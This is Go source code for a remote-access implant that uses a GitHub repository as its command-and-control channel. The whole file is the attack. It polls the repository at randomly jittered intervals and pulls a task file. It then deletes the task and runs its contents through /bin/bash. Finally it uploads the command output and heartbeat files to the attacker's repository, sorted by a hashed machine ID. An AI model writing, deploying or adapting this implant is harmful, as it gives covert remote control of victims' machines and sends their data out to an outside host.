package main

import (
	"crypto/hmac"
	"crypto/sha1"
	"fmt"
	"github.com/denisbrodbeck/machineid"
	"github.com/google/go-github/github"
	"golang.org/x/net/context"
	"golang.org/x/oauth2"
	"math/rand"
	"net/http"
	"os/exec"
	"sync"
	"time"
)

const getFile = "task.txt"

// Testing values
//const callback = 2800
//const jitter = 60
//const owner = "<owner>"
//const repo = "<repo>"
//const token = "<token>"
//const appKey = "<random_app_key>"

var callback int
var jitter int
var owner string
var repo string
var token string
var appKey string

var a Agent

type Agent struct {
	Callback	int
	Jitter		int
	Owner		string
	Repo		string
	Token		string
	Kill		bool
	AppId		string
}

func configAgent() {
	id, _ := machineid.ID()
	a.AppId = protect(appKey, id)

	a.Callback 	= callback
	a.Jitter	= jitter
	a.Owner 	= owner
	a.Repo		= repo
	a.Token		= token
	a.Kill		= false
}

func protect(appID, id string) string {
	mac := hmac.New(sha1.New, []byte(id))
	mac.Write([]byte(appID))
	return fmt.Sprintf("%x", mac.Sum(nil))
}

func uploadFile(tc *http.Client, ctx context.Context, contents []byte, name string) {
	client := github.NewClient(tc)

	// fileContent := []byte(contents)

	opts := &github.RepositoryContentFileOptions{
		Message:   github.String("upload"),
		Content:   contents,
	}

	currentTime := time.Now()
	currentTime.Format("20060102150405")
	p := fmt.Sprintf("%s/%s_%s.txt", a.AppId, name, currentTime.Format("20060102150405"))
	_, _, _ = client.Repositories.CreateFile(ctx, a.Owner, a.Repo, p, opts)
	fmt.Println("Upload: ", p)
}

func retrieveFile(tc *http.Client, ctx context.Context) {
	client := github.NewClient(tc)

	p := fmt.Sprintf("%s/%s", a.AppId, getFile)
	fmt.Println("Getting: ", p)
	file, _, z, err := client.Repositories.GetContents(ctx, a.Owner, a.Repo, p, nil)
	if err != nil {
		if z.Response.StatusCode == 404 {
			fmt.Println("Task: None")
			currentTime := time.Now()
			o := fmt.Sprintf(currentTime.Format("20060102150405"))
			fileContent := []byte(o)
			uploadFile(tc, ctx, fileContent, "heartbeat")
		}
		return
	}

	task, _ := file.GetContent()
	sha := file.GetSHA()
	fmt.Println("Task: ", task)
	fmt.Println("SHA: ", sha)

	deleteFile(tc, ctx, sha)
	output, err := exec.Command("/bin/bash", "-c", task).Output()
	if err != nil {
		return
	}
	uploadFile(tc, ctx, output, "result")

}

func deleteFile(tc *http.Client, ctx context.Context, sha string) {
	client := github.NewClient(tc)

	opts := &github.RepositoryContentFileOptions{
		Message:   github.String("delete"),
		Content:   nil,
		SHA: &sha,
	}

	p := fmt.Sprintf("%s/%s", a.AppId, getFile)
	_, _, _ = client.Repositories.DeleteFile(ctx, a.Owner, a.Repo, p, opts)
	fmt.Println("Delete: ", p)
}

func startPolling() {

	var wg sync.WaitGroup
	stop := make(chan bool)
	ticker := time.NewTicker(1 * time.Second)

	wg.Add(1)
	go func() {
		for {
			if a.Kill {
				wg.Done()
				stop <- true
				return
			}

			rand.Seed(time.Now().UnixNano())
			cf := rand.Intn(2)

			if cf == 1 {
				ticker = time.NewTicker(time.Duration(a.Callback + rand.Intn(a.Jitter)) * time.Second)
			} else {
				ticker = time.NewTicker(time.Duration(a.Callback - rand.Intn(a.Jitter)) * time.Second)
			}

			select {
			case <-ticker.C:
				ctx := context.Background()
				ts := oauth2.StaticTokenSource(
					&oauth2.Token{AccessToken: token},
				)
				tc := oauth2.NewClient(ctx, ts)

				retrieveFile(tc, ctx)
			}
		}
	}()
	wg.Wait()
}

func main() {
	configAgent()
	startPolling()
}
